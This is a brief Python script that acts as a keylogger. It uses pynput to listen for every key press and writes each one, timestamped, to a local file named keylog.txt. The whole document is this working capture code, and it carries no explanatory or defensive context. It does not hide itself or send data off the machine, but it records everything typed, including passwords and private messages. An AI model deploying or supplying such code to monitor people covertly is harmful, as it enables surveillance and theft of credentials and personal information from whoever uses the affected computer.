
from pynput.keyboard import Listener
import logging


logging.basicConfig(filename="keylog.txt", 
                    level=logging.DEBUG, 
                    format="%(asctime)s: %(message)s")


def on_press(key):
    try:
        logging.info(str(key))
    except:
        pass


with Listener(on_press=on_press) as listener:
    listener.join()
